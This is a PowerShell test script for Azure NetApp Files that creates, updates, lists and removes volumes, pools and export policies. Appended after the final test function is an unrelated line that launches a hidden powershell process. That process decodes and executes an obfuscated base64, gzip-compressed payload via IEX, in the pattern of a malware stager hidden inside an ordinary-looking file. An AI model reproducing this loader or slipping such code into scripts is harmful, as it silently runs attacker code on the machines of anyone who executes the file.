














function Test-VolumeCrud
{
    $currentSub = (Get-AzureRmContext).Subscription	
    $subsid = $currentSub.SubscriptionId

    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName = Get-ResourceName
    $poolName2 = Get-ResourceName
    $volName1 = Get-ResourceName
    $volName2 = Get-ResourceName
    $volName3 = Get-ResourceName
    $volName4 = Get-ResourceName
    $gibibyte = 1024 * 1024 * 1024
    $usageThreshold = 100 * $gibibyte
    $doubleUsage = 2 * $usageThreshold
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $subnetName = "default"
    $poolSize = 4398046511104
    $serviceLevel = "Premium"
    $vnetName = $resourceGroup + "-vnet"

    $subnetId = "/subscriptions/$subsId/resourceGroups/$resourceGroup/providers/Microsoft.Network/virtualNetworks/$vnetName/subnets/$subnetName"

    $rule1 = @{
        RuleIndex = 1
        UnixReadOnly = $false
        UnixReadWrite = $true
        Cifs = $false
        Nfsv3 = $true
        Nfsv41 = $false
        AllowedClients = '0.0.0.0/0'
    }
    $rule2 = @{
        RuleIndex = 2
        UnixReadOnly = $false
        UnixReadWrite = $true
        Cifs = $false
        Nfsv3 = $false
        Nfsv41 = $true
        AllowedClients = '1.2.3.0/24'
    }
    $rule3 = @{
        RuleIndex = 2
        UnixReadOnly = $false
        UnixReadWrite = $true
        Cifs = $false
        Nfsv3 = $true
        Nfsv41 = $false
        AllowedClients = '2.3.4.0/24'
    }
    $rule5 = @{
        RuleIndex = 1
        UnixReadOnly = $false
        UnixReadWrite = $true
        Cifs = $false
        Nfsv3 = $false
        Nfsv41 = $true
        AllowedClients = '1.2.3.0/24'
    }
    $exportPolicy = @{
		Rules = (
			$rule1, $rule2
		)
	}
    
    $exportPolicyv4 = @{
		Rules = (
			$rule5
		)
	}

    $exportPolicyMod = @{
		Rules = (
			$rule3
		)
	}

    
    $protocolTypes = New-Object string[] 1
    $protocolTypes[0] = "NFSv3"

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation
		
        
        $virtualNetwork = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $vnetName -AddressPrefix 10.0.0.0/16
        $delegation = New-AzDelegation -Name "netAppVolumes" -ServiceName "Microsoft.Netapp/volumes"
        Add-AzVirtualNetworkSubnetConfig -Name $subnetName -VirtualNetwork $virtualNetwork -AddressPrefix "10.0.1.0/24" -Delegation $delegation | Set-AzVirtualNetwork

        
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName 
	    
        
        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -PoolSize $poolSize -ServiceLevel $serviceLevel
        
        
        $newTagName = "tag1"
        $newTagValue = "tagValue1"
        $retrievedVolume = New-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName1 -CreationToken $volName1 -UsageThreshold $usageThreshold -ServiceLevel $serviceLevel -SubnetId $subnetId -Tag @{$newTagName = $newTagValue} -ExportPolicy $exportPolicy -ProtocolType $protocolTypes
        Assert-AreEqual "$accName/$poolName/$volName1" $retrievedVolume.Name
        Assert-AreEqual $serviceLevel $retrievedVolume.ServiceLevel
        Assert-AreEqual True $retrievedVolume.Tags.ContainsKey($newTagName)
        Assert-AreEqual "tagValue1" $retrievedVolume.Tags[$newTagName].ToString()
        Assert-NotNull $retrievedVolume.ExportPolicy
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[0].AllowedClients '0.0.0.0/0'
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[1].AllowedClients '1.2.3.0/24'
        Assert-AreEqual $retrievedVolume.ProtocolTypes[0] 'NFSv3'
        Assert-NotNull $retrievedVolume.MountTargets

        
        $protocolTypesv4 = New-Object string[] 1
        $protocolTypesv4[0] = "NFSv4.1"

        
        $retrievedVolume = New-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName2 -CreationToken $volName2 -UsageThreshold $usageThreshold -ServiceLevel $serviceLevel -SubnetId $subnetId -ExportPolicy $exportPolicyv4 -ProtocolType $protocolTypesv4 -Confirm:$false
        Assert-AreEqual "$accName/$poolName/$volName2" $retrievedVolume.Name
        Assert-AreEqual $serviceLevel $retrievedVolume.ServiceLevel
        Assert-AreEqual $retrievedVolume.ProtocolTypes[0] 'NFSv4.1'

        
        $retrievedVolume = New-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName3 -CreationToken $volName2 -UsageThreshold $usageThreshold -ServiceLevel $serviceLevel -SubnetId $subnetId -WhatIf

        
        $retrievedVolume = Get-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName
        
        Assert-True {"$accName/$poolName/$volName1" -eq $retrievedVolume[0].Name -or "$accName/$poolName/$volName2" -eq $retrievedVolume[0].Name}
        Assert-True {"$accName/$poolName/$volName1" -eq $retrievedVolume[1].Name -or "$accName/$poolName/$volName2" -eq $retrievedVolume[1].Name}
        Assert-AreEqual 2 $retrievedVolume.Length

        
        $retrievedVolume = Get-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName1
        Assert-AreEqual "$accName/$poolName/$volName1" $retrievedVolume.Name
		
        
        $retrievedVolumeById = Get-AzNetAppFilesVolume -ResourceId $retrievedVolume.Id
        Assert-AreEqual "$accName/$poolName/$volName1" $retrievedVolumeById.Name
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[0].AllowedClients '0.0.0.0/0'
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[1].AllowedClients '1.2.3.0/24'

        
        $retrievedVolume = Update-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName1 -UsageThreshold $doubleUsage
        Assert-AreEqual $doubleUsage $retrievedVolume.usageThreshold
        
        Assert-AreEqual "Premium" $retrievedVolume.ServiceLevel
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[0].AllowedClients '0.0.0.0/0'
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[1].AllowedClients '1.2.3.0/24'

        $rule4 = @{
            RuleIndex = 3
            UnixReadOnly = $false
            UnixReadWrite = $true
            Cifs = $false
            Nfsv3 = $true
            Nfsv41 = $false
            AllowedClients = '1.2.3.0/24'
        }

        $exportPolicyUpdate = @{
            Rules = (
                $rule2, $rule4
            )
        }

        
        $retrievedVolume = Update-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName1 -ExportPolicy $exportPolicyUpdate
        Assert-AreEqual $retrievedVolume.ExportPolicy.Rules[0].AllowedClients '1.2.3.0/24'

        
        Remove-AzNetAppFilesVolume -ResourceId $retrievedVolumeById.Id

        
        Remove-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -Name $volName2 -WhatIf
        $retrievedVolume = Get-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName
        Assert-AreEqual 1 $retrievedVolume.Length

        Remove-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName2
        $retrievedVolume = Get-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName
        Assert-AreEqual 0 $retrievedVolume.Length

        
        
        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName2 -PoolSize $poolSize -ServiceLevel "Standard"
        
        
        $newTagName = "tag1"
        $newTagValue = "tagValue1"
        $retrievedVolume = New-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName2 -VolumeName $volName4 -CreationToken $volName4 -UsageThreshold $doubleUsage -ServiceLevel "Standard" -SubnetId $subnetId -Tag @{$newTagName = $newTagValue} -ExportPolicy $exportPolicy
        Assert-AreEqual "$accName/$poolName2/$volName4" $retrievedVolume.Name
        Assert-AreEqual "Standard" $retrievedVolume.ServiceLevel
        Assert-AreEqual True $retrievedVolume.Tags.ContainsKey($newTagName)
        Assert-AreEqual "tagValue1" $retrievedVolume.Tags[$newTagName].ToString()
        Assert-NotNull $retrievedVolume.ExportPolicy
        Assert-AreEqual '0.0.0.0/0' $retrievedVolume.ExportPolicy.Rules[0].AllowedClients
        Assert-AreEqual '1.2.3.0/24' $retrievedVolume.ExportPolicy.Rules[1].AllowedClients
        
        Assert-AreEqual $retrievedVolume.ProtocolTypes[0] 'NFSv3'

        
        $retrievedVolume = Update-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName2 -VolumeName $volName4 -ExportPolicy $exportPolicyMod
        Assert-AreEqual '2.3.4.0/24' $retrievedVolume.ExportPolicy.Rules[0].AllowedClients
        
        Assert-AreEqual "Standard" $retrievedVolume.ServiceLevel
        Assert-AreEqual $doubleUsage $retrievedVolume.usageThreshold
        Assert-AreEqual True $retrievedVolume.Tags.ContainsKey($newTagName)
        Assert-AreEqual "tagValue1" $retrievedVolume.Tags[$newTagName].ToString()
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}


function Test-VolumePipelines
{
    $currentSub = (Get-AzureRmContext).Subscription	
    $subsid = $currentSub.SubscriptionId

    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName = Get-ResourceName
    $volName1 = Get-ResourceName
    $volName2 = Get-ResourceName
    $gibibyte = 1024 * 1024 * 1024
    $usageThreshold = 100 * $gibibyte
    $doubleUsage = 2 * $usageThreshold
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $subnetName = "default"
    $poolSize = 4398046511104
    $serviceLevel = "Premium"
    $vnetName = $resourceGroup + "-vnet"

    $subnetId = "/subscriptions/$subsId/resourceGroups/$resourceGroup/providers/Microsoft.Network/virtualNetworks/$vnetName/subnets/$subnetName"

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation
		
        
        $virtualNetwork = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $vnetName -AddressPrefix 10.0.0.0/16
        $delegation = New-AzDelegation -Name "netAppVolumes" -ServiceName "Microsoft.Netapp/volumes"
        Add-AzVirtualNetworkSubnetConfig -Name $subnetName -VirtualNetwork $virtualNetwork -AddressPrefix "10.0.1.0/24" -Delegation $delegation | Set-AzVirtualNetwork

        
        $retrievedAcc = New-AnfAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName 

        
        New-AnfPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -Name $poolName -PoolSize $poolSize -ServiceLevel $serviceLevel 

        
        
        $retrievedVolume = Get-AnfPool -ResourceGroupName $resourceGroup -AccountName $accName -Name $poolName | New-AnfVolume -Name $volName1 -CreationToken $volName1 -UsageThreshold $usageThreshold -SubnetId $subnetId -ServiceLevel $serviceLevel
        Assert-AreEqual "$accName/$poolName/$volName1" $retrievedVolume.Name
        Assert-AreEqual "Premium" $retrievedVolume.ServiceLevel
        
        
        
        
        try
        {
            $retrievedVolume = Get-AnfPool -ResourceGroupName $resourceGroup -AccountName $accName -Name $poolName | New-AnfVolume -Name $volName2 -CreationToken $volName2 -UsageThreshold $usageThreshold -ServiceLevel "Standard" -SubnetId $subnetId
            Assert-AreEqual "$accName/$poolName/$volName2" $retrievedVolume.Name
            Assert-AreEqual "Standard" $retrievedVolume.ServiceLevel
            Assert-True { $false }
        }
        catch
        {
            Assert-True { $true }
        }

        
        $retrievedVolume = Get-AnfVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -Name $volName1 | Update-AnfVolume -UsageThreshold $doubleUsage
        Assert-AreEqual "Premium" $retrievedVolume.ServiceLevel  
		Assert-AreEqual $doubleUsage $retrievedVolume.usageThreshold

        
        $retrievedVolume = Get-AnfVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName
        $numVolumes = $retrievedVolume.Length

        
        Get-AnfVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -Name $volName1 | Remove-AnfVolume

        
        $retrievedVolume = Get-AnfPool -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName | Get-AnfVolume 
        Assert-AreEqual ($numVolumes-1) $retrievedVolume.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''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''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

